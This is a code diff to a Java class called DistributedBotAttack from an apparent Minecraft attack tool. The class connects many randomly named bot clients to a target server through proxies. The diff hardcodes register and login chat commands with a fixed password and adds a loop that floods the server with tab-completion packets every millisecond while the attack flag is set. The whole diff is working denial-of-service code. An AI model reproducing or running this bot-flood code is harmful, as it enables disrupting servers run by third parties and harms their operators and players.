@@ -6,7 +6,12 @@ import me.alikomi.endminecraft.utils.Util;
 import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
+import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerMovementPacket;
+import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerPlaceBlockPacket;
+import org.spacehq.mc.protocol.packet.ingame.server.ServerChatPacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
+import org.spacehq.mc.protocol.packet.ingame.server.world.ServerWorldBorderPacket;
+import org.spacehq.mc.protocol.packet.login.server.LoginDisconnectPacket;
 import org.spacehq.packetlib.Client;
 import org.spacehq.packetlib.event.session.*;
 import org.spacehq.packetlib.tcp.TcpSessionFactory;
@@ -31,21 +36,19 @@ public class DistributedBotAttack extends Util {
     public static boolean isAttack = true;
     private static int index = 0;
     private static List<String> ipsKey;
-    private List<String> commandsInJoin = Main.configer.get(new ArrayList<String>(), "DBA.commands.commandsInJoin");
-    private List<String> commandsAttack = Main.configer.get(new ArrayList<String>(), "DBA.commands.commandsAttack");
-    private int commandsSleep = Main.configer.get(1, "DBA.commands.commandsSleep");
-    private boolean tab = Main.configer.get(Boolean.FALSE, "DBA.tabAttack.enable");
-    private int tabSleep = Main.configer.get(1, "DBA.tabAttack.sleep");
-    private String tabComplete = Main.configer.get("", "DBA.tabAttack.command");
+    private boolean tab;
+    private boolean lele;
 
 
-    public DistributedBotAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips) {
+    public DistributedBotAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips, boolean tab, boolean lele) {
         this.ip = ip;
         this.port = port;
         this.time = time;
         this.sleepTime = sleepTime;
         this.ips = ips;
         this.ipsKey = Arrays.asList(ips.keySet().toArray(new String[ips.size()]));
+        this.tab = tab;
+        this.lele = lele;
     }
 
     public boolean startAttack() {
@@ -98,15 +101,17 @@ public class DistributedBotAttack extends Util {
     }
 
     public static String getRandomString(int length) {
-        String str = "_abcde_fghijk_lmno_pqrst_uvw_xyzABCD_EFGHIJKLM_NOPQR_STUVWXY_Z012345_6789_";
+        String str = "_abcde_fghijk_lmnopqrst_uvw_xyzABCD_EFGHIJKLM_NOPQRSTUVWXY_Z012345_6789_";
         Random random = new Random();
         StringBuffer sb = new StringBuffer();
         for (int i = 0; i < length; ++i) {
-            int number = random.nextInt(74);// [0,62)
+            int number = random.nextInt(72);// [0,62)
             sb.append(str.charAt(number));
         }
         return sb.toString();
     }
+
+    boolean yy = false;
 
     private Client start(Proxy.Type tp, String po) {
         MinecraftProtocol mc = new MinecraftProtocol(getRandomString(new Random().nextInt(9) % (9 - 4 + 1) + 4));
@@ -115,37 +120,28 @@ public class DistributedBotAttack extends Util {
         client.getSession().addListener(new SessionListener() {
             public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                 if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {
+
                     new Thread(() -> {
-                        commandsInJoin.forEach((command) -> {
-                            try {
-                                Thread.sleep(commandsSleep);
-                            } catch (InterruptedException e) {
-                                e.printStackTrace();
+                        client.getSession().send(new ClientChatPacket("/register qwqovo8898 qwqovo8898"));
+                        try {
+                            Thread.sleep(2000);
+                        } catch (InterruptedException e) {
+                            e.printStackTrace();
+                        }
+                        client.getSession().send(new ClientChatPacket("/login qwqovo8898"));
+                        //TAB压测
+                        if (tab) {
+                            while (isAttack) {
+                                client.getSession().send(new ClientTabCompletePacket("/"));
+                                try {
+                                    Thread.sleep(1);
+                                } catch (InterruptedException e) {
+                                    e.printStackTrace();
+                                }
                             }
-                            client.getSession().send(new ClientChatPacket(command));
-                        });
-                        while (isAttack) {
-                            try {
-                                Thread.sleep(commandsSleep);
-                            } catch (InterruptedException e) {
-                                e.printStackTrace();
-                            }
-                            commandsAttack.forEach((command) -> {
-                                client.getSession().send(new ClientChatPacket(command));
-                            });
                         }
                     }).start();
 
-                    if (tab) {
-                        while (isAttack) {
-                            client.getSession().send(new ClientTabCompletePacket(tabComplete));
-                            try {
-                                Thread.sleep(tabSleep);
-                            } catch (InterruptedException e) {
-                                e.printStackTrace();
-                            }
-                        }
-                    }
                 }
             }
 
@@ -167,7 +163,7 @@ public class DistributedBotAttack extends Util {
                 log("用户 " + mc.getProfile().getName() + "断开连接： " + msg);
             }
         });
-        if (Main.leLe) new Thread(() -> getMotd(proxy)).start();
+        if (lele) new Thread(() -> getMotd(proxy)).start();
         return client;
     }
 
